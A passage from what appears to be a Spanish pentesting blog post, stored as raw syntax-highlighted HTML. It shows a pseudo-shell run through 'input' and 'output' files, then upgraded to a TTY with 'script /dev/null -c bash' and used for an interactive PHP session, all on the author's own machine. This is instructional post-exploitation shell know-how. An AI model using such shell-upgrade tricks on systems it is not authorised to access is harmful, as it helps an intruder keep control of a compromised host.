&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;pwd&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Si os fijáis, para cada comando proporcionado en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;input&lt;/code&gt;, se nos lista el resultado del comando aplicado a nivel de sistema en el fichero &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;output&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Ojo cuidado, esto sigue sin ser una TTY, sin embargo… podemos hacer lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;script /dev/null -c bash&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Script&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;started&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;null&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Fijaros cómo ahora se nos abre una consola aparte de la nuestra al leer el ficherito &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;output&lt;/code&gt;. Tal vez lo veis mejor así:&lt;/p&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Script&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;started&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;null&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ahí está. La superior a la de abajo del todo es la gestionada desde los ficheros &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;input&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;output&lt;/code&gt;. ¿Qué es lo mejor de todo?, lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;tty&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Script&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;started&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;null&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tty&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;4&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ya estamos en una TTY, y a partir de aquí es sencillo aprovechar al máximo las utilidades de consola:&lt;/p&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;php --interactive&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;'$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Hola&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;quit&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;
